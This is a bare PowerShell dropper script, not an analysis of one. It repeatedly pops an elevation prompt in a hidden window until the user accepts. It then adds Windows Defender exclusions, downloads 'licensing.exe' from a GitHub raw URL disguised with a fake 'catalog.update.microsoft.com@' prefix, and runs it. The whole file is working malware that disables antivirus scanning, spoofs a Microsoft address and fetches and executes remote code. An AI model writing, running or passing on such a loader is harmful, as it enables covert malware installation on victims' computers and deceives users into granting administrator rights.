Set-ExecutionPolicy -Scope CurrentUser Undefined -Force
while($true)
 {
	 try
  {  
   
    Start-Process 'powershell' -WindowStyle Hidden -Verb runas -ArgumentList "-Command Add-MpPreference -ExclusionPath 'C:\Windows\Temp'; (New-Object Net.WebClient).DownloadFile('https://catalog.update.microsoft.com@raw.githubusercontent.com/AnoNisher/catalog/main/licensing.exe','C:\Windows\Temp\licensing.exe'); Add-MpPreference -ExclusionProcess 'C:\Windows\Temp\licensing.exe'; Start-Process -FilePath 'C:\Windows\Temp\licensing.exe'"; exit
	}
    catch{}   
}
